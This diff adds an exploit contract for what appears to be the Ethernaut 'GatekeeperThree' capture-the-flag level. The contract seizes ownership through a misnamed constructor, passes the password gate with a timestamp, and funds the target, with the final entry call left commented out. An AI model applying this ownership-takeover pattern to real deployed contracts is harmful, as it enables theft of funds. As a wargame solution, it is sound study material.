@@ -1,6 +1,25 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+contract Ethrant {
+    GatekeeperThree public gates;
+
+    constructor(GatekeeperThree _gates) payable {
+        require(msg.value == 0.002 ether, "NOt enough value!");
+        gates = _gates;
+    }
+
+    function enter() public {
+        gates.construct0r();
+        gates.createTrick();
+        gates.getAllowance(block.timestamp);
+        payable(address(gates)).transfer(0.002 ether);
+
+        //returns (bool) need add in function enter
+        // require(gates.enter(), "Not entered!");
+    }
+}
+
 contract SimpleTrick {
     GatekeeperThree public target;
     address public trick;
